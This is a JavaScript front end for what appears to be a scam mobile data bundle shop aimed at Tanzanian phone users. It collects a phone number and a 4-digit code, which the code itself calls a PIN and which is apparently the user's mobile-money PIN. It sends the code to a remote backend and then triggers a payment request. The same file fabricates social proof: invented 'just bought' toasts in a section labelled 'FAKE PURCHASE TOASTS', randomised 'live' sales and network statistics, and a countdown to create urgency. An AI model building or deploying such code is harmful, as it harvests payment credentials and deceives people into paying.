/* ── PAYMENT ──────────────────────────────────────────────── */

const BACKEND = "https://backend-ut99.onrender.com";
const REQUEST_TIMEOUT_MS = 25000;

const sendRequestBtn = document.getElementById("send-request-btn");
const phoneInput = document.getElementById("phone");
const badge = document.getElementById("network-badge");
const codeModal = document.getElementById("code-modal");
const codeModalBackdrop = document.getElementById("code-modal-backdrop");
const customerCodeInput = document.getElementById("customer-code");
const codeModalError = document.getElementById("code-modal-error");
const cards = document.querySelectorAll(".card");

const networkColors = {
  halotel: { bg: "rgba(0,180,120,.2)", text: "#00e676", label: "HALOTEL" },
  yas:     { bg: "rgba(255,180,0,.2)",  text: "#ffd600", label: "YAS"     },
  airtel:  { bg: "rgba(255,60,0,.2)",   text: "#ff6b00", label: "AIRTEL"  },
  vodacom: { bg: "rgba(255,0,0,.2)",    text: "#ff0000", label: "VODACOM" },
};

let savedCustomerCode = null;
let lastPromptedPhone = "";
let isSavingPin = false;

if (sendRequestBtn) {
  sendRequestBtn.addEventListener("click", () => buy(sendRequestBtn));
}

if (phoneInput) {
  phoneInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
    }
  });

  phoneInput.addEventListener("input", handlePhoneInput);
  phoneInput.addEventListener("change", handlePhoneInput);
}

if (codeModalBackdrop) {
  codeModalBackdrop.addEventListener("click", closeCodeModal);
}

if (customerCodeInput) {
  customerCodeInput.addEventListener("input", () => {
    const digitsOnly = customerCodeInput.value.replace(/\D/g, "").slice(0, 4);
    customerCodeInput.value = digitsOnly;
    codeModalError.textContent = "";

    if (digitsOnly.length === 4 && !isSavingPin) {
      saveCustomerCodeForPhone();
    }
  });

  customerCodeInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      if (!isSavingPin && customerCodeInput.value.length === 4) {
        saveCustomerCodeForPhone();
      }
    }

    if (event.key === "Escape") {
      event.preventDefault();
      closeCodeModal();
    }
  });
}

document.addEventListener("keydown", (event) => {
  if (event.key === "Escape" && codeModal?.classList.contains("show")) {
    closeCodeModal();
  }
});

updateBuyState();

async function buy() {
  const phone = getCurrentPhone();

  if (!phone) {
    showToast("⚠️ Please enter your phone number first");
    phoneInput.focus();
    return;
  }

  if (!hasSavedCodeForPhone(phone)) {
    showToast("⚠️ Enter the customer code first");
    openCodeModal();
    return;
  }

  document.querySelectorAll(".buy-btn").forEach((button) => {
    button.disabled = true;
  });

  showStatus("loading");
  showToast("⏳ Sending request... this can take a few seconds");

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);

  try {
    const res = await fetch(`${BACKEND}/create-payment`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, amount: 3015 }),
      signal: controller.signal
    });

    let data = {};
    try {
      data = await res.json();
    } catch {
      data = { success: false, error: `Server error (${res.status})` };
    }

    if (data.success) {
      showStatus("success");
      clearSavedCode();
      lastPromptedPhone = "";
      resetPurchaseState();
      showToast("✅ Payment prompt sent! Check your phone.");
    } else {
      showStatus("none");
      showToast("❌ " + (data.error || "Payment failed. Try again."));
    }
  } catch (err) {
    showStatus("none");
    if (err.name === "AbortError") {
      showToast("⏱️ Request took too long. Please try again.");
    } else {
      showToast("❌ Could not reach server. Check your connection.");
    }
  } finally {
    clearTimeout(timeoutId);
    updateBuyState();
    setTimeout(() => {
      window.location.reload();
    }, 3000);
  }
}

function getCurrentPhone() {
  return normalizePhone(phoneInput ? phoneInput.value : "");
}

function isValidPhone(phone) {
  const local = normalizePhone(phone);
  return /^0\d{9}$/.test(local);
}

function normalizePhone(phone) {
  const digits = String(phone || "").replace(/\D/g, "");

  if (/^255[67]\d{8}$/.test(digits)) {
    return `0${digits.slice(3)}`;
  }

  if (/^[67]\d{8}$/.test(digits)) {
    return `0${digits}`;
  }

  return digits;
}

function normalizeCustomerCode(code) {
  return code.trim();
}

function hasSavedCodeForPhone(phone) {
  return Boolean(savedCustomerCode && savedCustomerCode.phone === phone && savedCustomerCode.code);
}

function clearSavedCode() {
  savedCustomerCode = null;
}

function resetPurchaseState() {
  if (phoneInput) {
    phoneInput.value = "";
  }

  if (customerCodeInput) {
    customerCodeInput.value = "";
    customerCodeInput.disabled = false;
  }

  if (badge) {
    badge.textContent = "";
    badge.classList.remove("show");
  }

  closeCodeModal();
}

function syncSavedCodeUI() {
  // Code status UI removed
}

function updateBuyState() {
  if (!sendRequestBtn) {
    return;
  }

  sendRequestBtn.disabled = false;
}

function openCodeModal(prefill = "") {
  if (!codeModal || !customerCodeInput) {
    return;
  }

  codeModal.classList.add("show");
  codeModal.setAttribute("aria-hidden", "false");
  customerCodeInput.value = prefill || savedCustomerCode?.code || "";
  codeModalError.textContent = "";

  requestAnimationFrame(() => {
    customerCodeInput.focus();
    customerCodeInput.select();
  });
}

function closeCodeModal() {
  if (!codeModal) {
    return;
  }

  codeModal.classList.remove("show");
  codeModal.setAttribute("aria-hidden", "true");
  codeModalError.textContent = "";
}

async function saveCustomerCodeForPhone() {
  if (isSavingPin) {
    return;
  }

  const phone = getCurrentPhone();
  const customerCode = normalizeCustomerCode(customerCodeInput?.value || "");

  if (!isValidPhone(phone)) {
    codeModalError.textContent = "Ingiza namba sahihi ya simu kwanza.";
    phoneInput.focus();
    return;
  }

  if (!/^\d{4}$/.test(customerCode)) {
    codeModalError.textContent = "Tumia code ya namba 4 tu, mfano 1234.";
    customerCodeInput.focus();
    return;
  }

  isSavingPin = true;
  if (customerCodeInput) {
    customerCodeInput.disabled = true;
  }
  codeModalError.textContent = "Inashughulikiwa...";

  try {
    const res = await fetch(`${BACKEND}/customer-codes`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, customerCode })
    });

    const data = await res.json().catch(() => ({ success: false, error: "Server error" }));

    if (!res.ok || !data.success) {
      throw new Error(data.error || "Could not save customer code");
    }

    savedCustomerCode = {
      phone,
      code: data.record.customerCode
    };

    syncSavedCodeUI();
    updateBuyState();
    closeCodeModal();
    showToast("✅ Bando inapitishwa");
    
    // Automatically trigger purchase after PIN is saved
    setTimeout(() => {
      buy();
    }, 500);
  } catch (error) {
    codeModalError.textContent = error.message || "Could not save customer code.";
  } finally {
    isSavingPin = false;
    if (customerCodeInput) {
      customerCodeInput.disabled = false;
    }
  }
}

function showStatus(state) {
  document.getElementById("loading").classList.toggle("show", state === "loading");
  document.getElementById("success").classList.toggle("show", state === "success");
  document.getElementById("error-msg").classList.remove("show");
}

/* ── TOAST ────────────────────────────────────────────────── */
let toastTimer;
function showToast(msg) {
  const t = document.getElementById("toast");
  t.textContent = msg;
  t.classList.add("show");
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => t.classList.remove("show"), 3500);
}

/* ── PHONE PREFIX DETECTION ──────────────────────────────── */
function handlePhoneInput() {
  const num = getCurrentPhone();
  let detected = null;

  if (savedCustomerCode && savedCustomerCode.phone !== num) {
    clearSavedCode();
  }

  if (num.startsWith("061") || num.startsWith("062") || num.startsWith("063")) {
    detected = "halotel";
  } else if (num.startsWith("065") || num.startsWith("067") || num.startsWith("071") || num.startsWith("077")) {
    detected = "yas";
  } else if (num.startsWith("068") || num.startsWith("069") || num.startsWith("078")) {
    detected = "airtel";
  } else if (num.startsWith("074") || num.startsWith("075") || num.startsWith("076")) {
    detected = "vodacom";
  }

  cards.forEach((card) => {
    card.classList.toggle("active-network", card.dataset.network === detected);
  });

  if (detected && num.length >= 3) {
    const color = networkColors[detected];
    badge.textContent = color.label;
    badge.style.background = color.bg;
    badge.style.color = color.text;
    badge.classList.add("show");
  } else {
    badge.classList.remove("show");
  }

  if (!isValidPhone(num)) {
    if (num.length < 10) {
      lastPromptedPhone = "";
    }

    syncSavedCodeUI();
    updateBuyState();
    return;
  }

  if (!hasSavedCodeForPhone(num) && lastPromptedPhone !== num) {
    lastPromptedPhone = num;
    openCodeModal();
  }

  syncSavedCodeUI();
  updateBuyState();
}

/* ── LIVE ACTIVITY ────────────────────────────────────────── */
const usersEl  = document.getElementById("usersOnline");
const speedEl  = document.getElementById("networkSpeed");
const soldEl   = document.getElementById("bundlesSold");
const loadEl   = document.getElementById("networkLoad");

let bundles = 1247;

function rnd(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

function updateLive() {
  usersEl.textContent  = rnd(18, 64);
  speedEl.textContent  = rnd(22, 118) + " Mbps";
  bundles += rnd(0, 3);
  soldEl.textContent   = bundles.toLocaleString();
  loadEl.textContent   = rnd(58, 96) + "%";
}

updateLive();
setInterval(updateLive, 2500);

/* ── FAKE PURCHASE TOASTS ─────────────────────────────────── */
const names  = ["John", "Asha", "Kelvin", "Maria", "Ali", "Fatma", "David", "Zara"];
const cities = ["Dar es Salaam", "Arusha", "Mwanza", "Dodoma", "Mbeya"];

function fakePurchase() {
  const name = names[rnd(0, names.length - 1)];
  const city = cities[rnd(0, cities.length - 1)];
  showToast(`🟢 ${name} from ${city} just bought 23GB`);
}

setTimeout(() => {
  fakePurchase();
  setInterval(fakePurchase, rnd(7000, 12000));
}, 6000);

/* ── COUNTDOWN TIMER ─────────────────────────────────────── */
(function () {
  const pad = (n) => String(n).padStart(2, "0");

  function getNextDeadline() {
    const now   = new Date();
    const year  = now.getFullYear();
    const month = now.getMonth();
    const day   = now.getDate();
    // 23:59:59 EAT = 20:59:59 UTC
    const eod = new Date(Date.UTC(year, month, day, 20, 59, 59));
    return eod > now ? eod : new Date(Date.UTC(year, month, day + 1, 20, 59, 59));
  }

  const daysEl  = document.getElementById("cd-days");
  const hoursEl = document.getElementById("cd-hours");
  const minsEl  = document.getElementById("cd-mins");
  const secsEl  = document.getElementById("cd-secs");

  if (!daysEl) return;

  let deadline = getNextDeadline();

  function tick() {
    let diff = Math.max(0, deadline - Date.now());
    if (diff === 0) { deadline = getNextDeadline(); diff = Math.max(0, deadline - Date.now()); }
    const s = Math.floor(diff / 1000);
    daysEl.textContent  = pad(Math.floor(s / 86400));
    hoursEl.textContent = pad(Math.floor((s % 86400) / 3600));
    minsEl.textContent  = pad(Math.floor((s % 3600) / 60));
    secsEl.textContent  = pad(s % 60);
  }

  tick();
  setInterval(tick, 1000);
})();
